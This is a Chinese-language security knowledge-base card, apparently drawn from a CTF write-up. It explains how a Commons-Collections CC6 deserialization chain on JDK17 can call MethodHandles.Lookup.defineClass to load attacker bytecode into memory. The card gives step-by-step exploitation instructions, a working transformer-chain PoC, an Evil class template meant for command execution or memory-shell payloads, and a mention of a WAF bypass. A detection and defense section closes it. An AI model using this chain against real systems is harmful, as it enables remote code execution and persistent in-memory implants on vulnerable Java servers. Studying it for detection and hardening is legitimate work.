---
id: web-java-classloader-methodhandles-lookup-defineclass-same-package
title: MethodHandles.Lookup.defineClass 同包加载字节码：lookup 调用者决定恶意类包名
type: scenario
domain: web
path: web/java/classloader
technique: methodhandles-lookup-defineclass-same-package
tags:
- java
- jdk17
- deserialization
- classloader
- defineclass
- methodhandles
- memory-shell
- cc6
cve: []
severity: high
confidence: medium
affected_versions: JDK 17（原文环境）
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V280
  verified_at: '2026-11-08T02:10:16+08:00'
  notes: 已对照原文与图 03/04 核对：Lookup.defineClass 的 PACKAGE 检查、ClassFile.newInstance 同包 pn.equals(pkgName)、CC6 InvokerTransformer 作为 lookup 调用者要求 Evil 同包 org.apache.commons.collections.functors、原文 PoC 转换链均符；affected_versions 标为原文 JDK17 环境，未在本机执行
url: /docs/web/java/classloader/web-java-classloader-methodhandles-lookup-defineclass-same-package/
draft: false
kb_aliases:
- Lookup.defineClass
- MethodHandles.lookup defineClass
- 同包 defineClass 约束
- ClassFile.newInstance package check
- JDK17 defineClass 入口
---

## 一句话结论

JDK17 下 `MethodHandles.lookup().defineClass(byte[])` 可在内存中定义任意字节码；`lookup()` 以 `Reflection.getCallerClass()` 作为 lookupClass，`defineClass` 要求 `PACKAGE` 访问模式，并在 `ClassFile.newInstance(bytes, lookupClass().getPackageName())` 中校验恶意类声明的包名必须与 lookup 调用者同包。用 CC6 的 `InvokerTransformer` 调用 lookup 时，调用者是 `org.apache.commons.collections.functors.InvokerTransformer`，因此 Evil 类必须声明 `package org.apache.commons.collections.functors;`；加载成功后由 `InstantiateTransformer` 触发其构造器。

## 原理

- **为什么需要换 defineClass 入口**：JDK17 强封装下，`TemplatesImpl`/BCEL 等传统链可能被过滤或不可用；反序列化链若能在链尾拿到任意 `defineClass`，就能把恶意字节码直接定义到内存中，不落盘。
- **`lookup()` 的 caller 决定包名**：`MethodHandles.lookup()` 的实现是 `new Lookup(Reflection.getCallerClass())`。当 CC6 的 `InvokerTransformer` 通过 `getDeclaredMethod("lookup")` + `invoke` 调用它时，调用者类是 `org.apache.commons.collections.functors.InvokerTransformer`，因此返回的 `Lookup` 的 lookupClass 的包名是 `org.apache.commons.collections.functors`。
- **`Lookup.defineClass` 的两道约束**：
  ```java
  public Class<?> defineClass(byte[] bytes) throws IllegalAccessException {
      ensureDefineClassPermission();
      if ((lookupModes() & PACKAGE) == 0)
          throw new IllegalAccessException("Lookup does not have PACKAGE access");
      return makeClassDefiner(bytes.clone()).defineClass(false);
  }
  private ClassDefiner makeClassDefiner(byte[] bytes) {
      ClassFile cf = ClassFile.newInstance(bytes, lookupClass().getPackageName());
      return new ClassDefiner(this, cf, STRONG_LOADER_LINK);
  }
  ```
  - `lookup()` 默认的 lookupModes 包含 PACKAGE；若使用 `publicLookup()` 则没有 PACKAGE，会直接抛异常。
  - `ClassFile.newInstance` 解析字节码里的类名，取最后一个 `.` 之前的部分作为 `pn`，与传入的 `pkgName` 比较；不相等就抛 `IllegalArgumentException(name + " not in same package as lookup class")`。因此恶意类必须声明与 lookup 调用者相同的包；默认包（`pn=""`）无法通过非空包名的校验。
- **加载器**：`ClassDefiner` 使用 lookupClass 对应的类加载器定义类；用 CC6 触发时通常是应用类加载器，因此 Evil 可以直接使用应用 classpath 上的 Spring/CC 类，而无需再注册新的 URLClassLoader。
- **CC6 触发链**：`HashMap`/`TiedMapEntry` → `LazyMap.get` → `ChainedTransformer.transform`，依次执行 `ConstantTransformer(MethodHandles.class)` → `InvokerTransformer.getDeclaredMethod("lookup")` → `InvokerTransformer.invoke` → `InvokerTransformer.defineClass(byte[])` → `InstantiateTransformer` 实例化 Evil。整条链只负责把字节码送进 JVM，Evil 的具体行为另见独立载荷卡。
- **为什么同包约束可满足**：CC6 gadget 的 `InvokerTransformer` 位于 `org.apache.commons.collections.functors` 包且已被应用加载，攻击者只需把 Evil 编译到同名包；该包在应用侧是普通命名包（非 JDK 内部包），`PACKAGE` 模式即可定义。

## 触发条件

- JDK 17（原文环境；`MethodHandles.Lookup.defineClass` 在该环境可用）。
- 存在 Java 反序列化入口（`ObjectInputStream.readObject`），且 classpath 上有 Commons-Collections 3.2.1（可由 Commons-Beanutils 1.9+ 传递引入）或等价 CC6 gadget。
- 攻击者能提供 Evil 类字节码，且其声明的包名与 lookup 调用者包名一致（本卡场景为 `org.apache.commons.collections.functors`）。
- 未启用会拦截 `defineClass`/反射调用的 SecurityManager 或 RASP；`ensureDefineClassPermission` 可通过。
- 若 WAF 过滤 `org.apache` 等类名字样，可叠加 UTF-8 overlong 编码绕过（见关联卡），但不属于本原子。

## 利用步骤

1. 编写 Evil 类，声明 `package org.apache.commons.collections.functors;`（必须与 CC6 的 InvokerTransformer 同包），把载荷逻辑放在构造器中；编译后读取 `.class` 字节。
2. 构造 CC6 transformer 数组：`ConstantTransformer(MethodHandles.class)` → `InvokerTransformer("getDeclaredMethod", ...)` 取 `lookup` → `InvokerTransformer("invoke", ...)` 得到 `Lookup` → `InvokerTransformer("defineClass", byte[].class, memcode)` → `InstantiateTransformer(new Class[0], new Object[0])` → `ConstantTransformer(1)`。
3. 用 `LazyMap` + `TiedMapEntry` + `HashMap` 包装触发链，并把 `iTransformers` 替换为上述数组。
4. 用 `ObjectOutputStream` 序列化 payload（WAF 场景可换 UTF-8 overlong 序列化器）。
5. 向反序列化入口发送 payload；`Lookup.defineClass` 校验包名通过后在内存中定义 Evil，`InstantiateTransformer` 调用其构造器执行载荷。
6. 若调用 lookup 的 gadget 类换成其他包，必须同步修改 Evil 的包名；若无法满足同包，改用其他 loader 入口。

## PoC

```java
byte[] memcode = Files.readAllBytes(Paths.get("/path/to/Evil.class"));

Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(MethodHandles.class),
    new InvokerTransformer("getDeclaredMethod",
        new Class[]{String.class, Class[].class},
        new Object[]{"lookup", new Class[0]}),
    new InvokerTransformer("invoke",
        new Class[]{Object.class, Object[].class},
        new Object[]{null, new Object[0]}),
    new InvokerTransformer("defineClass",
        new Class[]{byte[].class},
        new Object[]{memcode}),
    new InstantiateTransformer(new Class[0], new Object[0]),
    new ConstantTransformer(1)
};
```

```java
package org.apache.commons.collections.functors;   // 必须与 lookup 调用者同包

public class Evil {
    public Evil() {
        // 载荷逻辑（命令执行/内存马注册等）
    }
}
```

```text
# 包名不一致时的典型报错：
java.lang.IllegalArgumentException: org.example.Evil not in same package as lookup class
```

> 说明：原文在 JDK17 + Commons-Beanutils 1.9.2（自带 Commons-Collections 3.2.1）环境验证到类加载/实例化阶段；未在本机执行 payload。

## 变体与关联

- 入口选型：[[web-java-classloader-deserialization-memshell-loader-selection]] 覆盖 TemplatesImpl/BCEL/Groovy 等 loader 及其构造器/静态块触发差异；本卡补充 `MethodHandles.Lookup.defineClass` 这一入口。
- 模块绕过：[[web-java-classloader-jdk17-class-module-field-spoof]] 解决 Evil 内部对 JDK/Spring 内部成员 `setAccessible` 的强封装问题；与本卡是独立原子。
- 执行载荷：[[web-java-framework-spring-requestcontextholder-cmd-header-echo]] 提供 defineClass 之后从当前请求读 `cmd` 并回显的载荷。
- 触发链：[[web-java-deser-commonscollections-cc6-hashmap-hashset-invokertransformer]] 覆盖 CC6 的 HashMap/TiedMapEntry/LazyMap/ChainedTransformer 结构。
- 变体：lookup 调用者换成其他 gadget 包时，Evil 包名随之调整；`publicLookup()` 缺少 PACKAGE 不可用；JDK17 下 Spring 的 `ReflectUtils.defineClass` 也有同包要求，可作替代入口。
- 边界：JDK 版本、SecurityManager/RASP、包名不匹配、恶意类字节码版本与目标 JVM 不兼容都会导致失败；原文为 CTF 环境，需按目标 classpath 调整。

## 检测与防御

- 检测：监控 `MethodHandles.Lookup.defineClass` 调用，尤其是调用者为反序列化/gadget 类（`InvokerTransformer` 等）的情形；排查无 `CodeSource`、由 `defineClass` 动态产生且包名与某个 gadget 包一致的类；反序列化数据中出现 `MethodHandles`、`defineClass`、`org.apache.commons.collections.functors` 等组合。
- 防御：JEP 290 `ObjectInputFilter` 限制可反序列化类；移除/升级 Commons-Collections、Commons-Beanutils 等 gadget 依赖；RASP 拦截 `defineClass`/反射；保持 JDK 强封装并打补丁；必要时限制 `RuntimePermission("defineClass")`。
- 清理：重启 JVM 清除内存中定义的类；排查落盘文件与异常类加载；轮换可能泄露的凭据。
